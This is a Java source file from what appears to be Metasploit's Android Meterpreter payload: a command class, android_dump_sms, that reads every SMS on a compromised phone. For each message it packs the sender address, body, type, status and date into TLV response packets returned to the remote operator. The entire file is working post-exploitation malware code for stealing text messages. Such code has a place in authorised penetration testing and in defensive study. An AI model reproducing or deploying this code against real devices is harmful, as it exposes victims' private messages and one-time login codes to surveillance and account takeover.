package com.metasploit.meterpreter.android;

import android.database.Cursor;
import android.net.Uri;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class android_dump_sms implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_SMS_ADDRESS = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9001);
    private static final int TLV_TYPE_SMS_BODY = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9002);
    private static final int TLV_TYPE_SMS_TYPE = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9003);
    private static final int TLV_TYPE_SMS_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9004);
    private static final int TLV_TYPE_SMS_STATUS = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9005);
    private static final int TLV_TYPE_SMS_DATE = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9006);

    private static final String address = "address";
    private static final String body = "body";
    private static final String type = "type";
    private static final String status = "status";
    private static final String date = "date";
    private static final String sms = "content://sms/";

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        Uri uriSMSURI = Uri.parse(sms);
        Cursor cur = AndroidMeterpreter.getContext().getContentResolver()
                .query(uriSMSURI, null, null, null, null);

        while (cur.moveToNext()) {
            TLVPacket pckt = new TLVPacket();

            pckt.add(TLV_TYPE_SMS_ADDRESS,
                    cur.getString(cur.getColumnIndex(address)));
            pckt.add(TLV_TYPE_SMS_BODY, cur.getString(cur.getColumnIndex(body)));
            pckt.add(TLV_TYPE_SMS_TYPE, cur.getString(cur.getColumnIndex(type)));
            pckt.add(TLV_TYPE_SMS_STATUS,
                    cur.getString(cur.getColumnIndex(status)));
            pckt.add(TLV_TYPE_SMS_DATE, cur.getString(cur.getColumnIndex(date)));

            response.addOverflow(TLV_TYPE_SMS_GROUP, pckt);

        }

        cur.close();

        return ERROR_SUCCESS;
    }

}
